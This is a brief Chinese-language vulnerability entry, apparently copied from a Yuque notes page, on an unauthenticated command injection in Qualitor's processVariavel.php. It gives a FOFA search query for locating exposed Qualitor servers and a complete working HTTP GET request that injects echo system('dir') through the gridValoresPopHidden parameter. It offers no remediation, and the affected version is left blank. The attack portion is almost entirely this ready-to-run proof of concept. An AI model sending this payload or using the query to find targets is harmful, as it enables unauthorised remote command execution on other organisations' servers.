# Qualitor processVariavel.php存在未授权命令注入漏洞

# 一、漏洞简介
Qualitor processVariavel.php存在未授权命令注入漏洞

# 二、影响版本
+ Qualitor 

# 三、资产测绘
+ fofa`app="Qualitor-Web"`
+ 特征

![1727509167970-d543fa15-b1c4-40b9-91b1-f7e9d6b79657.png](./img/L8aYuzmwqs7PAe-c/1727509167970-d543fa15-b1c4-40b9-91b1-f7e9d6b79657-280269.png)

# 四、漏洞复现
```java
GET /html/ad/adpesquisasql/request/processVariavel.php?gridValoresPopHidden=echo%20system("dir"); HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

![1727509161767-de95985f-2148-44dd-93cb-de328a80fd07.png](./img/L8aYuzmwqs7PAe-c/1727509161767-de95985f-2148-44dd-93cb-de328a80fd07-616639.png)



> 更新: 2024-10-22 09:36:08  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qxvfq9fqnxr606r4>